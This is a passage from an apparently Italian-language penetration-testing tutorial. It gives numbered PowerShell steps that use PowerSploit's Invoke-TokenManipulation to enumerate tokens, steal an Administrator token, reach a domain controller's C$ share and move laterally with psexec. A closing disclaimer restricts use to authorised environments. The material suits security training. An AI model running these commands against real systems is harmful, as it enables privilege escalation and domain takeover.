# 2. Enumerate tokens
Invoke-TokenManipulation -Enumerate | Format-Table

# 3. Identify target (DA, SYSTEM)
$target = Invoke-TokenManipulation -Enumerate | Where-Object {
    $_.Username -like "*Administrator*" -and $_.LogonType -ne "Network"
} | Select -First 1

# 4. Steal token
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username $target.Username

# 5. In new cmd, test network auth
net use \\DC01\C$

# 6. Lateral movement
psexec.exe \\DC01 cmd.exe
```

***

**Disclaimer:** Invoke-TokenManipulation è tool di penetration testing per uso esclusivamente in ambienti autorizzati. L'utilizzo non autorizzato per impersonation e privilege escalation costituisce reato penale. Usa solo su infrastrutture di tua proprietà o con consenso scritto. Repository: [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (archived)
